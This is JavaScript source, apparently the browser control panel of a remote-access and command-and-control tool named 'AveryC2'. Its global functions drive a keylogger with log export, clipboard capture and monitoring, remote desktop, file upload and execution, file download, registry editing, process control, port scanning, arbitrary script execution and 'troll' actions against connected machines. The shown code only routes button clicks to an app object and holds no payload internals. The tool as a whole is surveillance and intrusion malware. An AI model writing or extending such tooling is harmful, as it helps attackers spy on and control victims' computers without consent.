        app.toggleNetstatMonitor(); // Stop monitoring when closing
    }
    document.getElementById('networkModal').style.display = 'none';
}

function switchNetworkTab(tab) {
    const app = window.averyC2App;
    if (app) app.switchNetworkTab(tab);
}

function refreshConnections() {
    const app = window.averyC2App;
    if (app) app.refreshConnections();
}

function filterConnections(event) {
    const app = window.averyC2App;
    if (app) app.filterConnections(event);
}

function closeSelectedConnection() {
    const app = window.averyC2App;
    if (app) app.closeSelectedConnection();
}

function toggleNetstatMonitor() {
    const app = window.averyC2App;
    if (app) app.toggleNetstatMonitor();
}

function startPortScan() {
    const app = window.averyC2App;
    if (app) app.startPortScan();
}

function stopPortScan() {
    const app = window.averyC2App;
    if (app) app.stopPortScan();
}

function setScanPreset(preset) {
    const app = window.averyC2App;
    if (app) app.setScanPreset(preset);
}


function closeRegistryModal() {
    document.getElementById('registryModal').style.display = 'none';
}

function navigateRegistry() {
    const app = window.averyC2App;
    if (app) app.navigateRegistry();
}

function refreshRegistry() {
    const app = window.averyC2App;
    if (app) app.refreshRegistry();
}

function showAddValueDialog() {
    const app = window.averyC2App;
    if (app) app.showAddValueDialog();
}

function hideAddValueDialog() {
    const app = window.averyC2App;
    if (app) app.hideAddValueDialog();
}

function saveRegistryValue() {
    const app = window.averyC2App;
    if (app) app.saveRegistryValue();
}

function deleteRegistryItem() {
    const app = window.averyC2App;
    if (app) app.deleteRegistryItem();
}

function toggleKeylogger() {
    const app = window.averyC2App;
    if (app) app.toggleKeylogger();
}

function getKeylog() {
    const app = window.averyC2App;
    if (app) app.getKeylog();
}

function clearKeylog() {
    const app = window.averyC2App;
    if (app) app.clearKeylog();
}

function exportKeylog() {
    const app = window.averyC2App;
    if (app) app.exportKeylog();
}
        
function closeClipboardModal() {
    document.getElementById('clipboardModal').style.display = 'none';
}

function getClipboard() {
    const app = window.averyC2App;
    if (app) app.getClipboard();
}

function setClipboard() {
    const app = window.averyC2App;
    if (app) app.setClipboard();
}

function clearClipboardInput() {
    const app = window.averyC2App;
    if (app) app.clearClipboardInput();
}

function toggleClipboardMonitor() {
    const app = window.averyC2App;
    if (app) app.toggleClipboardMonitor();
}
function closeProcessModal() {
    document.getElementById('processModal').style.display = 'none';
}

function refreshProcesses() {
    const app = window.averyC2App;
    if (app) app.refreshProcesses();
}

function searchProcesses(event) {
    const app = window.averyC2App;
    if (app) app.searchProcesses(event);
}

function killSelectedProcess() {
    const app = window.averyC2App;
    if (app) app.killSelectedProcess();
}

function setProcessPriority() {
    const app = window.averyC2App;
    if (app) app.setProcessPriority();
}

function showStartProcessDialog() {
    const app = window.averyC2App;
    if (app) app.showStartProcessDialog();
}

function hideStartProcessDialog() {
    const app = window.averyC2App;
    if (app) app.hideStartProcessDialog();
}

function startNewProcess() {
    const app = window.averyC2App;
    if (app) app.startNewProcess();
}

function getProcessDetails() {
    const app = window.averyC2App;
    if (app) app.getProcessDetails();
}

function hideProcessDetails() {
    const app = window.averyC2App;
    if (app) app.hideProcessDetails();
}

        // Global functions for modal controls
        function closeRdpModal() {
            const app = window.averyC2App;
            if (app) {
                app.stopRemoteDesktop();
            }
            document.getElementById('rdpModal').style.display = 'none';
        }
        
        function startRemoteDesktop() {
            const app = window.averyC2App;
            if (app) {
                app.startRemoteDesktop();
            }
        }
        
        function stopRemoteDesktop() {
            const app = window.averyC2App;
            if (app) {
                app.stopRemoteDesktop();
            }
        }
        
        function changeQuality() {
            const app = window.averyC2App;
            if (app && app.rdpActive) {
                // Restart with new quality
                app.stopRemoteDesktop();
                setTimeout(() => {
                    app.startRemoteDesktop();
                }, 500);
            }
        }
        
        function closeExecModal() {
            document.getElementById('execModal').style.display = 'none';
        }
        
        function handleFileSelect(event) {
            const app = window.averyC2App;
            if (app) {
                app.handleFileSelect(event);
            }
        }
        
        function uploadFile() {
            const app = window.averyC2App;
            if (app) {
                app.uploadFile();
            }
        }
        
        function executeFile() {
            const app = window.averyC2App;
            if (app) {
                app.executeFile();
            }
        }
        
        // File Manager functions
        function closeFmModal() {
            document.getElementById('fmModal').style.display = 'none';
        }
        
        function changeDrive() {
            const app = window.averyC2App;
            if (app) {
                app.changeDrive();
            }
        }
        
        function navigateToPath() {
            const app = window.averyC2App;
            if (app) {
                app.navigateToPath();
            }
        }
        
        function navigateUp() {
            const app = window.averyC2App;
            if (app) {
                app.navigateUp();
            }
        }
        
        function refreshFiles() {
            const app = window.averyC2App;
            if (app) {
                app.refreshFiles();
            }
        }
        
        function executeSelected() {
            const app = window.averyC2App;
            if (app) {
                app.executeSelected();
            }
        }
        
        function zipCurrent() {
            const app = window.averyC2App;
            if (app) {
                app.zipCurrent();
            }
        }
        
        function downloadSelected() {
            const app = window.averyC2App;
            if (app) {
                app.downloadSelected();
            }
        }
        
        function handleFmFileSelect(event) {
            const app = window.averyC2App;
            if (app) {
                app.handleFmFileSelect(event);
            }
        }
        
        function handlePathKeypress(event) {
            const app = window.averyC2App;
            if (app) {
                app.handlePathKeypress(event);
            }
        }
        
        // Initialize the application
      document.addEventListener('DOMContentLoaded', () => {
    window.averyC2App = new AveryC2();
    
    // Handle background music
    const bgMusic = document.getElementById('bgMusic');
    bgMusic.volume = 0.3; // Set volume to 30%
    
    // Try to play music on first user interaction
    const playMusic = () => {
        bgMusic.play().then(() => {
            console.log('Background music started');
            // Remove listeners once music starts
            document.removeEventListener('click', playMusic);
            document.removeEventListener('keydown', playMusic);
        }).catch(err => {
            console.log('Music autoplay prevented:', err);
        });
    };
    
    // Modern browsers require user interaction to play audio
    document.addEventListener('click', playMusic);
    document.addEventListener('keydown', playMusic);
    
    // Try to play immediately (might work on some browsers)
    playMusic();
});

function closeTrollModal() {
    document.getElementById('trollModal').style.display = 'none';
}

function sendTroll(trollType) {
    const app = window.averyC2App;
    if (app) app.sendTroll(trollType);
}

function closeSysInfoModal() {
    document.getElementById('sysInfoModal').style.display = 'none';
}

function switchSysInfoTab(tabName) {
    const app = window.averyC2App;
    if (app) app.switchSysInfoTab(tabName);
}

function closeScriptModal() {
    document.getElementById('scriptModal').style.display = 'none';
}

function executeCustomScript() {
    const app = window.averyC2App;
    if (app) app.executeCustomScript();
}
